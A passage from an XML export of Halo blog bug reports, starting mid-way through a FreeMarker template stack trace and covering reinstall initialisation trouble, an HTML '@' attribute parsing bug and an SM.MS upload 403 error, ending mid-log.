freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; user  [in template "themes/anatole/module/macro.ftl" at line 13, column 36]  ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use &lt;#if myOptionalVar??&gt;when-present&lt;#else&gt;when-missing&lt;/#if&gt;. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ----  ---- FTL stack trace ("~" means nesting-related): - Failed at: ${user.nickname!}  [in template "themes/anatole/module/macro.ftl" in macro "head" at line 13, column 34] - Reached through: @head title="${blog_title!}"  [in template "themes/anatole/index.ftl" at line 2, column 1] ---- at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnexpectedTypeException.newDescriptionBuilder(UnexpectedTypeException.java:85) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnexpectedTypeException.&lt;init&gt;(UnexpectedTypeException.java:48) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.NonHashException.&lt;init&gt;(NonHashException.java:49) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Dot._eval(Dot.java:48) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Expression.eval(Expression.java:101) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DefaultToExpression._eval(DefaultToExpression.java:88) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Expression.eval(Expression.java:101) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DollarVariable.accept(DollarVariable.java:63) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:367) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.invokeMacroOrFunctionCommonPart(Environment.java:872) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.invokeMacro(Environment.java:809) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnifiedCall.accept(UnifiedCall.java:83) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:331) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:337) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.process(Environment.java:310) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.template.Template.process(Template.java:383) ~[freemarker-2.3.29.jar:2.3.29] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.processTemplate(FreeMarkerView.java:391) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.doRender(FreeMarkerView.java:304) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.renderMergedTemplateModel(FreeMarkerView.java:255) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.AbstractTemplateView.renderMergedOutputModel(AbstractTemplateView.java:179) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:316) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1373) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1118) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] ... 59 common frames omitted  2020-03-09 14:48:29.800 ERROR 16271 --- [  XNIO-1 task-4] r.h.a.controller.core.CommonController   : Request URL: [http://127.0.0.1:8090/error], URI: [/error], Request Method: [GET], IP: [127.0.0.1] 2020-03-09 14:48:29.802 ERROR 16271 --- [  XNIO-1 task-4] r.h.a.controller.core.CommonController   : Captured an exception  org.springframework.web.util.NestedServletException: Request processing failed; nested exception is freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; user  [in template "themes/anatole/module/macro.ftl" at line 13, column 36]  ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use &lt;#if myOptionalVar??&gt;when-present&lt;#else&gt;when-missing&lt;/#if&gt;. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ----  ---- FTL stack trace ("~" means nesting-related): - Failed at: ${user.nickname!}  [in template "themes/anatole/module/macro.ftl" in macro "head" at line 13, column 34] - Reached through: @head title="${blog_title!}"  [in template "themes/anatole/index.ftl" at line 2, column 1] ---- at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:503) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:49) ~[main/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:38) ~[main/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) ~[spring-boot-actuator-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_152] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_152] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_152] Caused by: freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; user  [in template "themes/anatole/module/macro.ftl" at line 13, column 36]  ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use &lt;#if myOptionalVar??&gt;when-present&lt;#else&gt;when-missing&lt;/#if&gt;. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ----  ---- FTL stack trace ("~" means nesting-related): - Failed at: ${user.nickname!}  [in template "themes/anatole/module/macro.ftl" in macro "head" at line 13, column 34] - Reached through: @head title="${blog_title!}"  [in template "themes/anatole/index.ftl" at line 2, column 1] ---- at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnexpectedTypeException.newDescriptionBuilder(UnexpectedTypeException.java:85) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnexpectedTypeException.&lt;init&gt;(UnexpectedTypeException.java:48) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.NonHashException.&lt;init&gt;(NonHashException.java:49) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Dot._eval(Dot.java:48) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Expression.eval(Expression.java:101) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DefaultToExpression._eval(DefaultToExpression.java:88) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Expression.eval(Expression.java:101) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DollarVariable.accept(DollarVariable.java:63) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:367) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.invokeMacroOrFunctionCommonPart(Environment.java:872) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.invokeMacro(Environment.java:809) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnifiedCall.accept(UnifiedCall.java:83) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:331) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:337) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.process(Environment.java:310) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.template.Template.process(Template.java:383) ~[freemarker-2.3.29.jar:2.3.29] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.processTemplate(FreeMarkerView.java:391) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.doRender(FreeMarkerView.java:304) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.renderMergedTemplateModel(FreeMarkerView.java:255) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.AbstractTemplateView.renderMergedOutputModel(AbstractTemplateView.java:179) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:316) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1373) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1118) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] ... 59 common frames omitted  </body>
		<created>2020-03-09 06:53:01</created>
		<closed>2020-03-09 09:37:42</closed>
	</bug>
	<bug>
		<id>627</id>
		<title>重装halo后无法初始化</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt; 版本： 数据库：H2 运行模式：production 启动时间：2020-03-09 09:07  ---  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  重新安装之后，删除.halo文件夹可以进行正常初始化操作  ## 当前行为 重装过halo后，已经删除Administrator下的.halo文件夹，没有用户。重新启动之后，无法再进行初始化。进入网页直接是登录页面  ## 已经尝试过的解决办法  1.用postman发送post请求添加用户之后可以正常工作，但是想请问有其他的方法可以正常进行初始化吗？ http://127.0.0.1:8090/api/admin/installations  {"title":"zhou", "username":"zhou", "nickname":"zhou", "email":"1050@qq.com", "password":"zhouzhou"}  2.尝试直接在h2数据库插入用户，但是登录后博客未初始化(失败)  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-03-09 01:17:28</created>
		<closed>2020-03-11 07:34:41</closed>
	</bug>
	<bug>
		<id>622</id>
		<title>文章编辑器无法识别attribute中带有@字符的html代码</title>
		<body>   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！      请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - [x] 我已经安装了最新版的 Halo   - [x] 我已经搜索了已有的 Issues 列表中有关的信息   - [x] 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - [x] 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq   ## 我的环境     请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。   --- Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15  ## 错误日志     请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。）   --- 不需要错误日志 ## 期望行为     你期望会发生什么？  --- @是合法的html attribute字符，因此 `&lt;button @click="print"&gt;&lt;/button&gt;` 应当被转换为 `&lt;p&gt;&lt;button @click="print"&gt;&lt;/button&gt;&lt;/p&gt;`  &gt; Attributes have a name and a value. Attribute names must consist of one or more characters other than controls, U+0020 SPACE, U+0022 ("), U+0027 ('), U+003E (&gt;), U+002F (/), U+003D (=), and noncharacters. In the HTML syntax, attribute names, even those for foreign elements, may be written with any mix of ASCII lower and ASCII upper alphas.  参见：[HTML Standard](https://html.spec.whatwg.org/multipage/syntax.html#attributes-2)  ## 当前行为     描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。  ---  当使用带有@字符的attribute时，html始终无法被正常解析。 例子： `&lt;button @click="print"&gt;&lt;/button&gt;` 被错误的转换为 `&lt;p&gt;&amp;lt;button @click=“print”&amp;gt;Print&lt;/button&gt;&lt;/p&gt;`  截图： &lt;img width="1440" alt="Screen Shot 2020-03-07 at 2 22 03 AM" src="https://user-images.githubusercontent.com/24959084/76112248-cf361400-601c-11ea-919a-b3144e0c2414.png"&gt; &lt;img width="1440" alt="Screen Shot 2020-03-07 at 2 22 11 AM" src="https://user-images.githubusercontent.com/24959084/76112258-d3623180-601c-11ea-919d-dac43ccbcead.png"&gt; </body>
		<created>2020-03-06 18:39:30</created>
		<closed>2020-03-07 03:40:45</closed>
	</bug>
	<bug>
		<id>615</id>
		<title>SM.MS图床上传附件失败</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;   Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;   2020-03-04 23:58:44.901 ERROR 6 --- [XNIO-1 task-12] r.h.app.core.ControllerExceptionHandler  : Captured an exception  org.springframework.web.client.HttpClientErrorException$Forbidden: 403 Forbidden         at org.springframework.web.client.HttpClientErrorException.create(HttpClientErrorException.java:83) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.client.DefaultResponseErrorHandler.handleError(DefaultResponseErrorHandler.java:123) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.client.DefaultResponseErrorHandler.handleError(DefaultResponseErrorHandler.java:102) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.client.ResponseErrorHandler.handleError(ResponseErrorHandler.java:63) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.client.RestTemplate.handleResponse(RestTemplate.java:785) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.client.RestTemplate.doExecute(RestTemplate.java:743) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.client.RestTemplate.execute(RestTemplate.java:677) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.client.RestTemplate.postForEntity(RestTemplate.java:452) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at run.halo.app.handler.file.SmmsFileHandler.upload(SmmsFileHandler.java:100) ~[classes!/:1.2.0]         at run.halo.app.handler.file.FileHandlers.upload(FileHandlers.java:54) ~[classes!/:1.2.0]              at run.halo.app.service.impl.AttachmentServiceImpl.upload(AttachmentServiceImpl.java:106) ~[classes!/:1.2.0]         at run.halo.app.service.impl.AttachmentServiceImpl$$FastClassBySpringCGLIB$$2d9c80b9.invoke(&lt;generated&gt;) ~[classes!/:1.2.0]         at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at run.halo.app.service.impl.AttachmentServiceImpl$$EnhancerBySpringCGLIB$$99e50a55.upload(&lt;generated&gt;) ~[classes!/:1.2.0]         at run.halo.app.controller.admin.api.AttachmentController.uploadAttachment(AttachmentController.java:76) ~[classes!/:1.2.0]         at run.halo.app.controller.admin.api.AttachmentController$$FastClassBySpringCGLIB$$8f3ff968.invoke(&lt;generated&gt;) ~[classes!/:1.2.0]         at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes!/:1.2.0]          at sun.reflect.GeneratedMethodAccessor200.invoke(Unknown Source) ~[na:na]         at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_222]         at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_222]         at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:93) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at run.halo.app.controller.admin.api.AttachmentController$$EnhancerBySpringCGLIB$$457a70aa.uploadAttachment(&lt;generated&gt;) ~[classes!/:1.2.0]         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_222]         at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_222]         at 